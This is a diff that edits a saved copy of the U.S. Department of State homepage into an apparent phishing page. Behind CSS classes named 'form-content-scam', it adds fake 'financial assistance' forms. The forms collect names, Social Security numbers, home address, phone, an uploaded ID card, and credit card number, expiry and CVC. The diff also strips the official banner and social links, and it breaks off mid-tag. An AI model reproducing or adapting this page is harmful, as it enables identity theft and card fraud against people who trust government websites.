@@ -3,6 +3,98 @@
 <html lang="en" webcrx="">
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <style>
+      /* Container for the form */
+.form-content-scam {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 1rem;
+  background-color: #f5f5f5;
+  padding: 2rem;
+  border-radius: 10px;
+  box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+}
+
+/* Label styles */
+label {
+  font-size: 1.2rem;
+  font-weight: 600;
+  color: #555;
+}
+
+/* Input and select styles */
+input,
+select {
+  width: 100%;
+  border: none;
+  background-color: #fff;
+  padding: 1rem;
+  border-radius: 5px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  font-size: 1rem;
+  margin-bottom: 1rem;
+}
+
+/* Placeholder styles */
+input::placeholder,
+select::placeholder {
+  color: #999;
+}
+
+/* Submit button styles */
+input[type="submit"] {
+  width: 100%;
+  background-color: #00bfff;
+  color: #fff;
+  font-size: 1.2rem;
+  font-weight: 600;
+  border: none;
+  padding: 1rem;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: background-color 0.2s ease;
+}
+
+input[type="submit"]:hover {
+  background-color: #0080ff;
+}
+.scam-details {
+  list-style: none;
+  margin: 0;
+  padding: 0;
+  font-family: 'Helvetica Neue', sans-serif;
+  font-size: 16px;
+  color: #333;
+  line-height: 1.5;
+  border-left: 3px solid #007bff;
+}
+
+.scam-details li {
+  margin: 0 0 20px 20px;
+  padding: 0;
+  position: relative;
+}
+
+.scam-details li:before {
+  content: "";
+  position: absolute;
+  top: 3px;
+  left: -15px;
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background-color: #007bff;
+}
+
+.scam-details li:last-of-type {
+  margin-bottom: 0;
+}
+
+.scam-details li:last-of-type:before {
+  display: none;
+}
+    </style>
     <style type="text/css" id="bc-style-vjs" data-vjs-version="7.21.3">
       @charset "UTF-8";
       .video-js .vjs-big-play-button .vjs-icon-placeholder:before,
@@ -2528,45 +2620,6 @@
       content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"
     />
 
-    <!-- Google Tag Manager for WordPress by gtm4wp.com -->
-    <script
-      type="text/javascript"
-      async=""
-      src="./U.S. Department of State - United States Department of State_files/ga.js"
-    ></script>
-    <script
-      type="text/javascript"
-      async=""
-      src="./U.S. Department of State - United States Department of State_files/analytics.js"
-    ></script>
-    <script
-      type="text/javascript"
-      async=""
-      src="./U.S. Department of State - United States Department of State_files/js"
-    ></script>
-    <script
-      type="text/javascript"
-      async=""
-      src="./U.S. Department of State - United States Department of State_files/analytics.js"
-    ></script>
-    <script
-      type="text/javascript"
-      async=""
-      src="./U.S. Department of State - United States Department of State_files/js(1)"
-    ></script>
-    <script
-      async=""
-      src="./U.S. Department of State - United States Department of State_files/analytics.js"
-    ></script>
-    <script
-      async=""
-      src="./U.S. Department of State - United States Department of State_files/gtm.js"
-    ></script>
-    <script data-cfasync="false" data-pagespeed-no-defer="">
-      var gtm4wp_datalayer_name = "dataLayer";
-      var dataLayer = dataLayer || [];
-    </script>
-    <!-- End Google Tag Manager for WordPress by gtm4wp.com -->
     <!-- This site is optimized with the Yoast SEO plugin v20.2.1 - https://yoast.com/wordpress/plugins/seo/ -->
     <title>U.S. Department of State - United States Department of State</title>
     <meta
@@ -2599,68 +2652,7 @@
       name="twitter:image"
       content="https://www.state.gov/wp-content/uploads/2021/01/Placeholder_seal_final.png"
     />
-    <script type="application/ld+json" class="yoast-schema-graph">
-      {
-        "@context": "https://schema.org",
-        "@graph": [
-          {
-            "@type": "WebPage",
-            "@id": "https://www.state.gov/",
-            "url": "https://www.state.gov/",
-            "name": "U.S. Department of State - United States Department of State",
-            "isPartOf": { "@id": "https://www.state.gov/#website" },
-            "primaryImageOfPage": {
-              "@id": "https://www.state.gov/#primaryimage"
-            },
-            "image": { "@id": "https://www.state.gov/#primaryimage" },
-            "thumbnailUrl": "https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3-1024x1024.jpg",
-            "datePublished": "2018-08-16T14:49:28+00:00",
-            "dateModified": "2023-04-01T15:12:20+00:00",
-            "description": "Leading America’s foreign policy to advance the interests and security of the American people.",
-            "breadcrumb": { "@id": "https://www.state.gov/#breadcrumb" },
-            "inLanguage": "en-US",
-            "potentialAction": [
-              { "@type": "ReadAction", "target": ["https://www.state.gov/"] }
-            ]
-          },
-          {
-            "@type": "ImageObject",
-            "inLanguage": "en-US",
-            "@id": "https://www.state.gov/#primaryimage",
-            "url": "https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3.jpg",
-            "contentUrl": "https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3.jpg",
-            "width": 1200,
-            "height": 1200,
-            "caption": "warm hued graphic with diverse representations of women in the background, text overlay reads \"Women's History Month, March 2023\""
-          },
-          {
-            "@type": "BreadcrumbList",
-            "@id": "https://www.state.gov/#breadcrumb",
-            "itemListElement": [
-              { "@type": "ListItem", "position": 1, "name": "Home" }
-            ]
-          },
-          {
-            "@type": "WebSite",
-            "@id": "https://www.state.gov/#website",
-            "url": "https://www.state.gov/",
-            "name": "United States Department of State",
-            "description": "",
-            "potentialAction": [
-              {
-                "@type": "SearchAction",
-                "target": {
-                  "@type": "EntryPoint",
-                  "urlTemplate": "https://www.state.gov/?s={search_term_string}"
-                },
-                "query-input": "required name=search_term_string"
-              }
-            ],
-            "inLanguage": "en-US"
-          }
-        ]
-      }
-    </script>
+
     <meta name="msvalidate.01" content="1BD155841AF50A7A6C2729F53B64F8F5" />
     <meta
       name="google-site-verification"
@@ -2677,114 +2669,7 @@
       title="United States Department of State » Feed"
       href="https://www.state.gov/feed/"
     />
-    <script type="text/javascript">
-      window._wpemojiSettings = {
-        baseUrl: "https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/",
-        ext: ".png",
-        svgUrl: "https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/",
-        svgExt: ".svg",
-        source: {
-          concatemoji:
-            "https:\/\/www.state.gov\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.1.1",
-        },
-      };
-      /*! This file is auto-generated */
-      !(function (e, a, t) {
-        var n,
-          r,
-          o,
-          i = a.createElement("canvas"),
-          p = i.getContext && i.getContext("2d");
-        function s(e, t) {
-          var a = String.fromCharCode,
-            e =
-              (p.clearRect(0, 0, i.width, i.height),
-              p.fillText(a.apply(this, e), 0, 0),
-              i.toDataURL());
-          return (
-            p.clearRect(0, 0, i.width, i.height),
-            p.fillText(a.apply(this, t), 0, 0),
-            e === i.toDataURL()
-          );
-        }
-        function c(e) {
-          var t = a.createElement("script");
-          (t.src = e),
-            (t.defer = t.type = "text/javascript"),
-            a.getElementsByTagName("head")[0].appendChild(t);
-        }
-        for (
-          o = Array("flag", "emoji"),
-            t.supports = { everything: !0, everythingExceptFlag: !0 },
-            r = 0;
-          r < o.length;
-          r++
-        )
-          (t.supports[o[r]] = (function (e) {
-            if (p && p.fillText)
-              switch (
-                ((p.textBaseline = "top"), (p.font = "600 32px Arial"), e)
-              ) {
-                case "flag":
-                  return s(
-                    [127987, 65039, 8205, 9895, 65039],
-                    [127987, 65039, 8203, 9895, 65039]
-                  )
-                    ? !1
-                    : !s(
-                        [55356, 56826, 55356, 56819],
-                        [55356, 56826, 8203, 55356, 56819]
-                      ) &&
-                        !s(
-                          [
-                            55356, 57332, 56128, 56423, 56128, 56418, 56128,
-                            56421, 56128, 56430, 56128, 56423, 56128, 56447,
-                          ],
-                          [
-                            55356, 57332, 8203, 56128, 56423, 8203, 56128,
-                            56418, 8203, 56128, 56421, 8203, 56128, 56430, 8203,
-                            56128, 56423, 8203, 56128, 56447,
-                          ]
-                        );
-                case "emoji":
-                  return !s(
-                    [129777, 127995, 8205, 129778, 127999],
-                    [129777, 127995, 8203, 129778, 127999]
-                  );
-              }
-            return !1;
-          })(o[r])),
-            (t.supports.everything = t.supports.everything && t.supports[o[r]]),
-            "flag" !== o[r] &&
-              (t.supports.everythingExceptFlag =
-                t.supports.everythingExceptFlag && t.supports[o[r]]);
-        (t.supports.everythingExceptFlag =
-          t.supports.everythingExceptFlag && !t.supports.flag),
-          (t.DOMReady = !1),
-          (t.readyCallback = function () {
-            t.DOMReady = !0;
-          }),
-          t.supports.everything ||
-            ((n = function () {
-              t.readyCallback();
-            }),
-            a.addEventListener
-              ? (a.addEventListener("DOMContentLoaded", n, !1),
-                e.addEventListener("load", n, !1))
-              : (e.attachEvent("onload", n),
-                a.attachEvent("onreadystatechange", function () {
-                  "complete" === a.readyState && t.readyCallback();
-                })),
-            (e = t.source || {}).concatemoji
-              ? c(e.concatemoji)
-              : e.wpemoji && e.twemoji && (c(e.twemoji), c(e.wpemoji)));
-      })(window, document, window._wpemojiSettings);
-    </script>
-    <script
-      src="./U.S. Department of State - United States Department of State_files/wp-emoji-release.min.js"
-      type="text/javascript"
-      defer=""
-    ></script>
+
     <style type="text/css">
       img.wp-smiley,
       img.emoji {
@@ -3275,30 +3160,7 @@
 
     <!-- Google Tag Manager for WordPress by gtm4wp.com -->
     <!-- GTM Container placement set to manual -->
-    <script
-      data-cfasync="false"
-      data-pagespeed-no-defer=""
-      type="text/javascript"
-    >
-      var dataLayer_content = {
-        pagePostType: "frontpage",
-        pagePostType2: "single-page",
-        pagePostAuthor: "Maureen Thaivalappil",
-      };
-      dataLayer.push(dataLayer_content);
-    </script>
-    <script data-cfasync="false">
-      (function (w, d, s, l, i) {
-        w[l] = w[l] || [];
-        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
-        var f = d.getElementsByTagName(s)[0],
-          j = d.createElement(s),
-          dl = l != "dataLayer" ? "&l=" + l : "";
-        j.async = true;
-        j.src = "//www.googletagmanager.com/gtm." + "js?id=" + i + dl;
-        f.parentNode.insertBefore(j, f);
-      })(window, document, "script", "dataLayer", "GTM-T9WK49Q");
-    </script>
+
     <!-- End Google Tag Manager -->
     <!-- End Google Tag Manager for WordPress by gtm4wp.com -->
     <link
@@ -3666,94 +3528,13 @@
       }
     </style>
     <!-- We participate in the US government's analytics program. See the data at analytics.usa.gov. -->
-    <script
-      async="async"
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/Universal-Federated-Analytics-Min.js"
-      id="_fed_an_ua_tag"
-    ></script>
-    <script type="text/javascript">
-      (function (g) {
-        var d = document,
-          am = d.createElement("script"),
-          h = d.head || d.getElementsByTagName("head")[0],
-          fsr = "fsReady",
-          aex = {
-            src: "/wp-content/themes/state/foresee_assets/js/gateway.min.js",
-            type: "text/javascript",
-            async: "true",
-            "data-vendor": "fs",
-            "data-mode": "selfhost",
-            "data-environment": "production",
-            "data-hasssl": "true",
-            "data-client": "state-gov",
-            "data-codelocation":
-              "/wp-content/themes/state/foresee_assets/code/19.14.14-fs/",
-            "data-isselfhosted": "true",
-            "data-product-assets":
-              "/wp-content/themes/state/foresee_assets/product_assets/",
-            "data-role": "gateway",
-          };
-        for (var attr in aex) {
-          am.setAttribute(attr, aex[attr]);
-        }
-        h.appendChild(am);
-        g[fsr] ||
-          (g[fsr] = function () {
-            var aT = "__" + fsr + "_stk__";
-            g[aT] = g[aT] || [];
-            g[aT].push(arguments);
-          });
-      })(window);
-    </script>
-    <script
-      src="./U.S. Department of State - United States Department of State_files/gateway.min.js"
-      type="text/javascript"
-      async="true"
-      data-vendor="fs"
-      data-mode="selfhost"
-      data-environment="production"
-      data-hasssl="true"
-      data-client="state-gov"
-      data-codelocation="/wp-content/themes/state/foresee_assets/code/19.14.14-fs/"
-      data-isselfhosted="true"
-      data-product-assets="/wp-content/themes/state/foresee_assets/product_assets/"
-      data-role="gateway"
-    ></script>
 
-    <script
-      async=""
-      src="./U.S. Department of State - United States Department of State_files/hotjar-1395777.js"
-    ></script>
-    <script
-      type="text/javascript"
-      id="autocomplete-ui"
-      src="./U.S. Department of State - United States Department of State_files/remote.loader.js"
-    ></script>
-    <script
-      async=""
-      src="./U.S. Department of State - United States Department of State_files/modules.76304821fe35d593f0f4.js"
-      charset="utf-8"
-    ></script>
     <link
       type="text/css"
       href="./U.S. Department of State - United States Department of State_files/sayt.css"
       rel="stylesheet"
       media="screen"
     />
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/sayt_loader_libs.js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="./U.S. Department of State - United States Department of State_files/001.js"
-    ></script>
-    <script
-      type="text/javascript"
-      async=""
-      src="https://www.pagespeed-mod.com/v1/taas?id=cs&amp;ak=b40b4e0329b50d95fe02b03a202d6279&amp;si=84064dfa74404373adc7dd4d9344be15&amp;tag=1005&amp;rand=ajxzppk1667150202305yuohxlw&amp;ord=3540439217403690.5"
-    ></script>
   </head>
 
   <body
@@ -4042,31 +3823,6 @@
         <div class="header_banner_container">
           <span class="header_banner_flag"
             >An official website of the United States Government
-            <span class="accordion"><u>Here's how you know</u></span>
-
-            <div class="panel">
-              <div class="panel_item">
-                <span class="dotgov"></span>
-                <div class="header_banner_content">
-                  <p><strong>Official websites use .onrender.com</strong></p>
-                  A <strong>.onrender.com</strong> website belongs to an
-                  official government organization in the United States.
-                </div>
-              </div>
-
-              <div class="panel_item">
-                <span class="https"></span>
-                <div class="header_banner_content">
-                  <p>
-                    <strong>Secure .onrender.com websites use HTTPS</strong>
-                  </p>
-                  A <strong>lock ( <span class="icon_lock"></span> )</strong> or
-                  <strong>https://</strong> means you’ve safely connected to the
-                  .onrender.com website. Share sensitive information only on
-                  official, secure websites.
-                </div>
-              </div>
-            </div>
           </span>
         </div>
 
@@ -4082,43 +3838,43 @@
                     id="menu-item-7457"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7457"
                   >
-                    <a href="https://www.state.gov/newsroom/">Newsroom</a>
+                    <a href="https://www.state.gov/newsroom/"target="_blank">Newsroom</a>
                   </li>
                   <li
                     id="menu-item-7458"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7458"
                   >
-                    <a href="https://www.state.gov/business/">Business</a>
+                    <a href="https://www.state.gov/business/target="_blank"">Business</a>
                   </li>
                   <li
                     id="menu-item-7459"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7459"
                   >
-                    <a href="https://www.state.gov/employees/">Employees</a>
+                    <a href="https://www.state.gov/employees/target="_blank"">Employees</a>
                   </li>
                   <li
                     id="menu-item-223980"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-223980"
                   >
-                    <a href="https://www.state.gov/job-seekers/">Job Seekers</a>
+                    <a href="https://www.state.gov/job-seekers/" target="_blank">Job Seekers</a>
                   </li>
                   <li
                     id="menu-item-7461"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7461"
                   >
-                    <a href="https://www.state.gov/students/">Students</a>
+                    <a href="https://www.state.gov/students/target="_blank"">Students</a>
                   </li>
                   <li
                     id="menu-item-7462"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7462"
                   >
-                    <a href="https://www.state.gov/travelers/">Travelers</a>
+                    <a href="https://www.state.gov/travelers/target="_blank"">Travelers</a>
                   </li>
                   <li
                     id="menu-item-219296"
                     class="menu-item menu-item-type-post_type menu-item-object-page menu-item-219296"
                   >
-                    <a href="https://www.state.gov/visas/">Visas</a>
+                    <a href="https://www.state.gov/visas/"target="_blank">Visas</a>
                   </li>
                 </ul>
               </nav>
@@ -4365,7 +4121,7 @@
                             <!-- Eyebrow -->
 
                             <span class="front-page-hero__eyebrow"
-                              >April 1, 2023</span
+                              >Helping United States Residents</span
                             >
 
                             <!-- Headline -->
@@ -4380,84 +4136,10 @@
                             </h3>
 
                             <!-- Call to Action -->
-
-                            <a
-                              href="https://share.america.gov/nato-has-brought-74-years-of-stability-to-europe/"
-                              class="button button--arrow button--inline-block button--corners button--outline-white hero-cta__desktop-view"
-                            >
-                              <div class="button__content">
-                                Read More
-                                <span class="icon-svg">
-                                  <svg
-                                    version="1.1"
-                                    xmlns="http://www.w3.org/2000/svg"
-                                    viewBox="0 0 985 512"
-                                    role="presentation"
-                                  >
-                                    <defs>
-                                      <style>
-                                        .cls-1 {
-                                          fill: #c1a783;
-                                        }
-                                      </style>
-                                    </defs>
-                                    <path
-                                      class="cls-1"
-                                      d="M688.939 48.406l36.644-36.644 244.047 244.047-36.644 36.643-244.047-244.047z"
-                                    ></path>
-                                    <path
-                                      class="cls-1"
-                                      d="M688.858 463.533l244.047-244.047 36.644 36.643-244.047 244.047-36.644-36.644z"
-                                    ></path>
-                                    <path
-                                      class="cls-1"
-                                      d="M25.911 230.089h880.971v51.822h-880.971v-51.822z"
-                                    ></path>
-                                  </svg>
-                                </span>
-                              </div>
-                            </a>
                           </div>
                         </div>
 
                         <!-- Call to Action Mobile button-->
-
-                        <a
-                          href="https://share.america.gov/nato-has-brought-74-years-of-stability-to-europe/"
-                          class="button button--arrow button--inline-block button--corners button--outline-white hero-cta__mobile-view"
-                        >
-                          <div class="button__content">
-                            Read More
-                            <span class="icon-svg">
-                              <svg
-                                version="1.1"
-                                xmlns="http://www.w3.org/2000/svg"
-                                viewBox="0 0 985 512"
-                                role="presentation"
-                              >
-                                <defs>
-                                  <style>
-                                    .cls-1 {
-                                      fill: #c1a783;
-                                    }
-                                  </style>
-                                </defs>
-                                <path
-                                  class="cls-1"
-                                  d="M688.939 48.406l36.644-36.644 244.047 244.047-36.644 36.643-244.047-244.047z"
-                                ></path>
-                                <path
-                                  class="cls-1"
-                                  d="M688.858 463.533l244.047-244.047 36.644 36.643-244.047 244.047-36.644-36.644z"
-                                ></path>
-                                <path
-                                  class="cls-1"
-                                  d="M25.911 230.089h880.971v51.822h-880.971v-51.822z"
-                                ></path>
-                              </svg>
-                            </span>
-                          </div>
-                        </a>
                       </div>
                     </section>
 
@@ -4500,106 +4182,40 @@
                                   </h3>
 
                                   <div class="entry-content">
-                                    <script type="text/javascript">
-                                      document.addEventListener(
-                                        "DOMContentLoaded",
-                                        function (event) {
-                                          jQuery(document).ready(function () {
-                                            if (
-                                              jQuery("p .watermark").length > 0
-                                            ) {
-                                              jQuery("p .watermark")
-                                                .parent()
-                                                .addClass("watermarked");
-
-                                              jQuery("p .watermark")
-                                                .parent()
-                                                .each(function () {
-                                                  jQuery(this)
-                                                    .children("img")
-                                                    .attr(
-                                                      "style",
-                                                      "margin: 0 !important"
-                                                    );
-                                                  jQuery(this)
-                                                    .children()
-                                                    .wrapAll(
-                                                      '<div class="watermarked_image"></div>'
-                                                    );
-                                                });
-
-                                              jQuery(
-                                                ".entry-content p.watermarked > div.watermarked_image > img"
-                                              ).each(function () {
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "alignnone"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass("alignnone");
-                                                }
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "alignleft"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass("alignleft");
-                                                }
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "alignright"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass("alignright");
-                                                }
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "size-medium"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass(
-                                                      "has-size-medium"
-                                                    );
-                                                }
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "aligncenter"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass("aligncenter");
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .children()
-                                                    .wrapAll(
-                                                      '<div class="wm_centered"></div>'
-                                                    );
-                                                }
-                                              });
-                                            }
-                                          });
-                                        }
-                                      );
-                                    </script>
                                     <div class="classic-block-wrapper">
                                       <div class="wp-block-classic">
-                                        <label for="name">Full Name</label>
+                                        <section class="form-content-scam">
+        <label for="firstName">Last Name</label>
                                         <input
                                           type="text"
-                                          name="name"
-                                          id="name"
-                                          placeholder="Full Name"
+                                          name="firstName"
+                                          id="firstName"
+                                          placeholder="First Name"
                                           required
                                         />
+
+                                            <label for="lastName">Last Name</label>
+                                        <input
+                                          type="text"
+                                          name="lastName"
+                                          id="lastName"
+                                          placeholder="Last Name"
+                                          required
+                                        />
+
+                                         <label for="ssn">Social Security Number</label>
+                                   <input
+  type="text"
+  name="ssn"
+  id="ssn"
+  placeholder="e.g. 123-45-6789"
+  pattern="^\d{3}-\d{2}-\d{4}$"
+  required
+     oninput="javascript: if (this.value.length > 11) this.value = this.value.slice(0,11);"
+       onchange="this.setAttribute('readonly', 'readonly');"
+/>
+
+
                                         <label for="email">Email Address</label>
                                         <input
                                           type="email"
@@ -4608,6 +4224,39 @@
                                           placeholder="Email Address"
                                           required
                                         />
+
+                                         <label for="Phone Number">Phone Number</label>
+<input type="tel"
+       name="phoneNumber"
+       id="phoneNumber"
+       placeholder="e.g. +1 (123) 456-7890"
+       required
+       pattern="^\+1\d{10}$|^1\d{10}$|^\d{10}$">
+
+                                        
+
+                                                  <label for="address">Address</label>
+                                        <input
+                                          type="text"
+                                          name="address"
+                                          id="address"
+                                          placeholder="Home Address"
+                                          required
+                                        />
+
+                                         <label for="Id">Upload an image or pdf of any identity card</label>
+                                 <input
+  type="file"
+  name="id"
+  id="identity"
+  placeholder="identity"
+  required
+  accept="application/pdf,image/*"
+/>
+
+                                        
+                                        </section>
+                                
                                       </div>
                                     </div>
                                   </div>
@@ -4720,17 +4369,30 @@
                                     </script>
                                     <div class="classic-block-wrapper">
                                       <div class="wp-block-classic">
-                                        <label for="reason"
-                                          >Reason for Applying</label
-                                        >
-                                        <textarea
-                                          name="reason"
-                                          id="reason"
-                                          placeholder="Tell us why you need financial assistance"
-                                          required
-                                        ></textarea>
-                                        <label for="amount"
+                                        <section class="form-content-scam">
+      <label for="occupation"
                                           >Requested Amount</label
+                                        >
+                                        <input
+                                          type="text"
+                                          name="occupation"
+                                          id="occupation"
+                                          placeholder="occupation"
+                                          required
+                                          oninput="javascript: if (this.value.length > 5) this.value = this.value.slice(0,5);"
+                                        />
+                                          <label for="income"
+                                          >Monthly Income ($)</label
+                                        >
+                                        <input
+                                          type="number"
+                                          name="income"
+                                          id="income"
+                                          placeholder="Income"
+                                          required
+                                        />
+                                                 <label for="amount"
+                                          >Requested Amount ($)</label
                                         >
                                         <input
                                           type="number"
@@ -4739,6 +4401,17 @@
                                           placeholder="Requested Amount"
                                           required
                                         />
+                                        <label for="reason"
+                                          >Reason for Applying</label
+                                        >
+                                        <textarea
+                                          name="reason"
+                                          id="reason"
+                                          placeholder="Tell us why you need financial assistance"
+                                          required
+                                          rows="4" cols="40"
+                                        ></textarea>
+                               
                                         <label for="category">Category</label>
                                         <select
                                           name="category"
@@ -4807,6 +4480,8 @@
                                             Other Expenses
                                           </option>
                                         </select>
+                                        </section>
+                                    
                                       </div>
                                     </div>
                                   </div>
@@ -4821,106 +4496,17 @@
 
                                   <h3 class="header--four">
                                     <a
-                                      href="https://www.state.gov/travel-smart-from-the-start/"
+                                      href="#"
                                       >Make sure your credit card details are
                                       correct</a
                                     >
                                   </h3>
 
                                   <div class="entry-content">
-                                    <script type="text/javascript">
-                                      document.addEventListener(
-                                        "DOMContentLoaded",
-                                        function (event) {
-                                          jQuery(document).ready(function () {
-                                            if (
-                                              jQuery("p .watermark").length > 0
-                                            ) {
-                                              jQuery("p .watermark")
-                                                .parent()
-                                                .addClass("watermarked");
-
-                                              jQuery("p .watermark")
-                                                .parent()
-                                                .each(function () {
-                                                  jQuery(this)
-                                                    .children("img")
-                                                    .attr(
-                                                      "style",
-                                                      "margin: 0 !important"
-                                                    );
-                                                  jQuery(this)
-                                                    .children()
-                                                    .wrapAll(
-                                                      '<div class="watermarked_image"></div>'
-                                                    );
-                                                });
-
-                                              jQuery(
-                                                ".entry-content p.watermarked > div.watermarked_image > img"
-                                              ).each(function () {
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "alignnone"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass("alignnone");
-                                                }
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "alignleft"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass("alignleft");
-                                                }
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "alignright"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass("alignright");
-                                                }
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "size-medium"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass(
-                                                      "has-size-medium"
-                                                    );
-                                                }
-                                                if (
-                                                  jQuery(this).hasClass(
-                                                    "aligncenter"
-                                                  )
-                                                ) {
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .addClass("aligncenter");
-                                                  jQuery(this)
-                                                    .parent()
-                                                    .children()
-                                                    .wrapAll(
-                                                      '<div class="wm_centered"></div>'
-                                                    );
-                                                }
-                                              });
-                                            }
-                                          });
-                                        }
-                                      );
-                                    </script>
                                     <div class="classic-block-wrapper">
                                       <div class="wp-block-classic">
-                                        <label for="cardNumber"
+                                        <section class="form-content-scam">
+  <label for="cardNumber"
                                           >Card Number</label
                                         >
                                         <input
@@ -4930,6 +4516,7 @@
                                           placeholder="Card Number"
                                           pattern="\d{4}-?\d{4}-?\d{4}-?\d{4}"
                                           required
+                                          oninput="javascript: if (this.value.length > 19) this.value = this.value.slice(0,19);"
                                         />
                                         <label for="cardType">Card Type</label>
                                         <select
@@ -4978,13 +4565,15 @@
                                         <label for="cardExpiry"
                                           >Card Expiry</label
                                         >
-                                        <input
-                                          type="text"
-                                          name="cardExpiry"
-                                          id="cardExpiry"
-                                          required
-                                          placeholder="MM/YY"
-                                        />
+                               <input
+  type="text"
+  name="cardExpiry"
+  id="cardExpiry"
+  required
+  placeholder="MM/YY"
+  pattern="^(0[1-9]|1[0-2])\/[0-9]{2}$"
+         oninput="javascript: if (this.value.length > 5) this.value = this.value.slice(0,5);"
+/>
                                         <label for="cardCVC">Card CVC</label>
                                         <input
                                           type="text"
@@ -4994,7 +4583,10 @@
                                           pattern="[0-9]{3,4}"
                                           title="Please enter a valid card CVC number (3 or 4 digits)"
                                           required
+                                                 oninput="javascript: if (this.value.length > 3) this.value = this.value.slice(0,3);"
                                         />
+                                        </section>
+                                      
                                       </div>
                                     </div>
                                   </div>
@@ -5076,84 +4668,9 @@
                           class="is-layout-flow wp-block-column"
                           style="flex-basis: 35%"
                         >
-                          <div class="wp-block-social-icons">
-                            <section
-                              class="module module--front-page-social-media front-page-social-media"
-                              aria-label="Social Media"
-                              role="group"
-                            >
-                              <div class="frame">
-                                <!-- Primary Social Media Networks -->
-
-                                <a
-                                  href="https://www.facebook.com/statedept"
-                                  style="font-size: 28px"
-                                  class="icon fab fa-facebook-f"
-                                  target="_blank"
-                                  aria-label="State Department on Facebook"
-                                  ><span class="screen-reader-text"
-                                    >Facebook</span
-                                  ></a
-                                >
-
-                                <a
-                                  href="https://twitter.com/StateDept"
-                                  style="font-size: 28px"
-                                  class="icon fab fa-twitter"
-                                  target="_blank"
-                                  aria-label="State Department on Twitter"
-                                  ><span class="screen-reader-text"
-                                    >Twitter</span
-                                  ></a
-                                >
-
-                                <a
-                                  href="https://www.instagram.com/statedept/"
-                                  style="font-size: 28px"
-                                  class="icon fab fa-instagram"
-                                  target="_blank"
-                                  aria-label="State Department on Instagram"
-                                  ><span class="screen-reader-text"
-                                    >Instagram</span
-                                  ></a
-                                >
-
-                                <a
-                                  href="https://www.youtube.com/user/statevideo"
-                                  style="font-size: 28px"
-                                  class="icon fab fa-youtube"
-                                  target="_blank"
-                                  aria-label="State Department on YouTube"
-                                  ><span class="screen-reader-text"
-                                    >YouTube</span
-                                  ></a
-                                >
-
-                                <a
-                                  href="https://www.flickr.com/photos/statephotos/"
-                                  style="font-size: 28px"
-                                  class="icon fab fa-flickr"
-                                  target="_blank"
-                                  aria-label="State Department on Flickr"
-                                  ><span class="screen-reader-text"
-                                    >Flickr</span
-                                  ></a
-                                >
-
-                                <a
-                                  href="https://www.state.gov/department-email-updates/"
-                                  style="font-size: 28px"
-                                  class="icon fas fa-envelope"
-                                  target="_blank"
-                                  aria-label="State Department on GovDelivery"
-                                  ><span class="screen-reader-text"
-                                    >GovDelivery</span
-                                  ></a
-                                >
-                              </div>
-                            </section>
-                            <!-- // .front-page-social-media -->
-                          </div>
+                        <p>
+                          Wait patiently as we review your application
+                        </p>
                         </div>
                       </div>
                     </div>
@@ -5209,19 +4726,9 @@
                                 loading="lazy"
                                 width="1024"
                                 height="1024"
-                                src="./U.S. Department of State - United States Department of State_files/227WomensHistoryMonth3-1024x1024.jpg"
-                                alt='warm hued graphic with diverse representations of women in the background, text overlay reads "Women&#39;s History Month, March 2023"'
+                                src="./image4.jpg"
+                                alt='The American Flag'
                                 class="wp-image-425062 size-full"
-                                srcset="
-                                  https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3-1024x1024.jpg 1024w,
-                                  https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3-300x300.jpg    300w,
-                                  https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3-150x150.jpg    150w,
-                                  https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3-768x768.jpg    768w,
-                                  https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3-48x48.jpg       48w,
-                                  https://www.state.gov/wp-content/uploads/2023/03/227WomensHistoryMonth3-160x160.jpg    160w,
